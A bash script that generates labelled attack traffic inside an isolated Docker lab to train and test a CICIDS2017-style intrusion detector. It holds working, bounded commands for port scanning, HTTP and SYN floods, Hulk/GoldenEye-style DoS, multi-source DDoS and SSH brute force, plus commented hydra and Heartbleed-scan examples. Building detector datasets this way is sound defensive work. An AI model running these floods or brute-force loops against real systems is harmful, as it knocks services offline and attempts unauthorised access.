#!/usr/bin/env bash
# Generate ATTACK traffic from server-a (10.10.1.10) against server-b (10.10.3.10) and save it
# from the r1-r2 link, the same link the benign capture uses. This gives attack and normal
# traffic measured on ONE network, which is what the detector needs to be trained and tested on.
#
# Isolated lab only: every network in docker-compose.yml is `internal: true`, the only target is
# our own container, and each attack is bounded (fixed packet/request counts, no open-ended flood).
# The tools are standard and published -- nmap, nping (ships with nmap) and curl -- and this is how
# the CICIDS2017 training set itself was generated, so the test matches what the model was trained on.
#
# Each attack is written to its own pcap so every flow in a file has a known label.
# Usage: lab/attack_traffic.sh <prefix>
#   writes lab/captures/<prefix>_scan.pcap, <prefix>_httpflood.pcap, <prefix>_synflood.pcap,
#          <prefix>_hulk.pcap, <prefix>_goldeneye.pcap, <prefix>_ddos.pcap, <prefix>_ssh_patator.pcap
set -euo pipefail
cd "$(dirname "$0")"
prefix="$1"
compose="docker compose"
victim=10.10.3.10
# Keep only traffic between the two lab subnets (drops host-bridge multicast), same as the benign capture.
filter='(tcp or udp) and ((src net 10.10.1.0/24 and dst net 10.10.3.0/24) or (src net 10.10.3.0/24 and dst net 10.10.1.0/24))'

iface=$($compose exec -T capture sh -c "ip -o -4 addr show | awk '/10\.10\.2\.2/ {print \$2}'")

start_capture() {
  $compose exec -d -T capture tcpdump -i "$iface" -U -s 128 -w "/captures/$1.pcap" "$filter"
  sleep 1
}
stop_capture() {
  sleep 1
  $compose exec -T capture pkill -INT tcpdump || true
  sleep 1
  $compose exec -T capture chown "$(id -u):$(id -g)" "/captures/$1.pcap"
  ls -la "captures/$1.pcap"
}

echo "== PortScan: nmap SYN scan over 10,000 ports =="
start_capture "${prefix}_scan"
$compose exec -T server-a nmap -sS -T4 -n --max-retries 1 --host-timeout 120s -p 1-10000 "$victim" >/dev/null || true
stop_capture "${prefix}_scan"

echo "== HTTP flood: 20 workers x 200 GETs against nginx =="
start_capture "${prefix}_httpflood"
$compose exec -T server-a sh -c '
  for w in $(seq 20); do
    ( for i in $(seq 200); do curl -s -o /dev/null --max-time 5 "http://'"$victim"':8080/"; done ) &
  done
  wait' || true
stop_capture "${prefix}_httpflood"

echo "== SYN flood: nping half-open SYNs across 800 source ports (bounded) =="
# Spread the SYNs over many source ports so the extractor sees many short flood flows,
# the way a real multi-source SYN flood looks, instead of one giant flow.
start_capture "${prefix}_synflood"
$compose exec -T server-a sh -c '
  for w in $(seq 20); do
    ( base=$((20000 + w * 40))
      for off in $(seq 0 39); do
        nping --tcp -p 8080 --flags syn -g $((base + off)) -c 15 --rate 1500 -N -q "'"$victim"'" >/dev/null 2>&1
      done ) &
  done
  wait' || true
stop_capture "${prefix}_synflood"


echo "== DoS Hulk: GET flood with unique URLs and no-cache headers, 20 workers x 200 requests =="
start_capture "${prefix}_hulk"
$compose exec -T server-a sh -c '
  for w in $(seq 20); do
    ( for i in $(seq 200); do
        curl -s -o /dev/null --max-time 5 \
          -H "Cache-Control: no-cache" -H "Pragma: no-cache" \
          -A "hulk-$w-$i" "http://'"$victim"':8080/?id=$w-$i-$RANDOM"; done ) &
  done
  wait' || true
stop_capture "${prefix}_hulk"

echo "== DoS GoldenEye: keep-alive flood with randomized params, 15 workers x 300 requests =="
start_capture "${prefix}_goldeneye"
$compose exec -T server-a sh -c '
  for w in $(seq 15); do
    ( args="";
      for i in $(seq 300); do
        args="$args -o /dev/null http://'"$victim"':8080/?_=$w-$i-$RANDOM";
      done
      curl -s --keepalive-time 60 $args ) &
  done
  wait' || true
stop_capture "${prefix}_goldeneye"

echo "== DDoS (LOIT): HTTP flood launched from several source hosts at once =="
# A volumetric flood from multiple sources across the subnets, the shape of the CICIDS2017
# LOIC-based DDoS. Every source targets the one victim service; each run is bounded.
start_capture "${prefix}_ddos"
for src in server-a client-a1 client-a2 client-b1 server-c client-c1; do
  $compose exec -T "$src" sh -c '
    for i in $(seq 400); do
      curl -s -o /dev/null --max-time 5 "http://'"$victim"':8080/?ddos=$i-$RANDOM"; done' &
done
wait
stop_capture "${prefix}_ddos"

echo "== SSH-Patator: repeated SSH login attempts against sshd (brute-force shape) =="
# Many short SSH connections with failing credentials, the connection pattern of a Patator/Hydra
# brute force. Bounded to a fixed attempt count; the lab's sshd uses key auth so all attempts fail.
start_capture "${prefix}_ssh_patator"
$compose exec -T server-a sh -c '
  for i in $(seq 300); do
    ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
        "baduser$i@'"$victim"'" true >/dev/null 2>&1 || true
  done' || true
stop_capture "${prefix}_ssh_patator"

# ---------------------------------------------------------------------------
# NOT YET IMPLEMENTED. The attacks below each need a target service this lab
# does not run, which would mean adding new containers/images (a structure
# change). They are listed so the attack set matches the CICIDS2017 vocabulary;
# fill in each generator once the required service exists, in the same
# start_capture / exec / stop_capture shape as the blocks above.
# ---------------------------------------------------------------------------

echo "== FTP-Patator: NOT IMPLEMENTED (needs an FTP server, e.g. vsftpd, in the lab) =="
# TODO: add an FTP service container, then brute force it from an attacker host, e.g.:
#   $compose exec -T attacker hydra -l ftpuser -P wordlist.txt "ftp://$victim"

echo "== Heartbleed: NOT IMPLEMENTED (needs a vulnerable OpenSSL TLS server) =="
# TODO: add a container serving TLS with a Heartbleed-vulnerable OpenSSL, then:
#   $compose exec -T attacker nmap --script ssl-heartbleed -p 443 "$victim"

echo "== Infiltration: NOT IMPLEMENTED (needs a vulnerable host + exploit framework) =="
# TODO: add a vulnerable target and run an exploit/backdoor stage (CICIDS2017 used
# Metasploit plus an internal port scan; only the internal scan exists today above).

echo "== Botnet (ARES): NOT IMPLEMENTED (needs an ARES C2 server and bot agents) =="
# TODO: add an ARES command-and-control container and bot agents on client hosts,
# then capture the periodic C2 beaconing between them.

echo "done: lab/captures/${prefix}_{scan,httpflood,synflood,hulk,goldeneye,ddos,ssh_patator}.pcap"
